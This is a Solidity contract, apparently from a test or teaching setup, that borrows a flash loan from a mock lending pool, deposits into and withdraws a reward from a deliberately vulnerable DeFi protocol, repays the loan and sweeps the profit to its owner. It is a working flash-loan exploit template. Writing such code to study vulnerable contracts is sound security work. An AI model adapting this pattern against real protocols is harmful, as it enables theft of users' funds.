// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "./MockLendingPool.sol";              // exposes IAaveFlashBorrowerSimple
import "./VulnerableDeFiProtocol.sol";

contract AttackerContract is IAaveFlashBorrowerSimple {
    MockLendingPool public pool;
    IERC20 public token;
    VulnerableDeFiProtocol public target;
    address public owner;

    event Profit(uint256 profit);

    constructor(address _pool, address _token, address _target) {
        pool = MockLendingPool(_pool);
        token = IERC20(_token);
        target = VulnerableDeFiProtocol(_target);
        owner = msg.sender;
    }

    /// @notice Initiates the flash loan. Pool will callback `executeOperation`.
    function attack(uint256 amount, bytes calldata params) external {
        require(msg.sender == owner, "ONLY_OWNER");
        pool.flashLoanSimple(address(this), address(token), amount, params);
    }

    /// @dev Aave v3-style callback. Must return true on success.
    function executeOperation(
        address asset,
        uint256 amount,
        uint256 premium,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {
        require(msg.sender == address(pool), "ONLY_POOL");
        require(asset == address(token), "UNEXPECTED_ASSET");

        // ===== Exploit flow (example) =====
        // 1) Approve vulnerable protocol to pull tokens
        token.approve(address(target), amount);

        // 2) Interact with vulnerable protocol
        target.deposit(amount);
        target.withdrawWithReward();
        // ==================================

        // Repay flash loan: approve pool to pull `amount + premium`
        uint256 totalOwed = amount + premium;
        token.approve(address(pool), totalOwed);

        // Emit profit (whatever remains after repayment)
        uint256 bal = token.balanceOf(address(this));
        if (bal > totalOwed) {
            emit Profit(bal - totalOwed);
        } else {
            emit Profit(0);
        }
        return true;
    }

    /// @notice Optional: pull out profits to EOA for inspection
    function sweep(address to) external {
        require(msg.sender == owner, "ONLY_OWNER");
        uint256 bal = token.balanceOf(address(this));
        token.transfer(to, bal);
    }
}
